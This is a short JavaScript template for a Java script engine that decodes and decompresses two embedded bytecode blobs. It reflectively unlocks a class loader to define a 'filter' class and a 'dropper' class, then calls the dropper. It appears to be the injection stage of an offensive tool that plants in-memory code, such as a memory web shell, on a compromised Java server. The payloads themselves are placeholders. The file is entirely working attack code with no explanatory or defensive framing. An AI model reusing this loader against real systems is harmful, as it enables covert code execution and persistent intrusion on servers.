function decompress(compressed) '{'
    var gis = new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressed));
    var bos = new java.io.ByteArrayOutputStream();
    var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
    var n = 0;
    while((n = gis.read(buf)) > 0) '{'
        bos.write(buf, 0, n);
    '}'
    return bos.toByteArray();
'}'

function decodeBase64(encoded) '{'
    try '{'
        return javax.xml.bind.DatatypeConverter.parseBase64Binary(encoded);
    '}'
    catch(err) '{'
        return java.util.Base64.getDecoder().decode(encoded);
    '}'
'}'

var parentCl = java.lang.Thread.currentThread().getContextClassLoader();
var filterClassName = "{0}";
var dropperClassName = "{1}";
// todo: support old jdk
var filterBytecode = java.nio.ByteBuffer.wrap(decompress(decodeBase64("{2}")));
var dropperBytecode = java.nio.ByteBuffer.wrap(decompress(decodeBase64("{3}")));

var sclClazz = java.security.SecureClassLoader.class;
var sclConstructor = sclClazz.getDeclaredConstructor(java.lang.ClassLoader.class);
sclConstructor.setAccessible(true);
var scl = sclConstructor.newInstance(parentCl);
var defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
defineClass.setAccessible(true);

// todo: compressed bytecode
var supportClass = defineClass.invoke(scl, filterClassName, filterBytecode, null);
var dropperClass = defineClass.invoke(scl, dropperClassName, dropperBytecode, null);
dropperClass.getMethod("taste", java.lang.String.class, java.lang.String.class).invoke(null, "{4}", "{5}");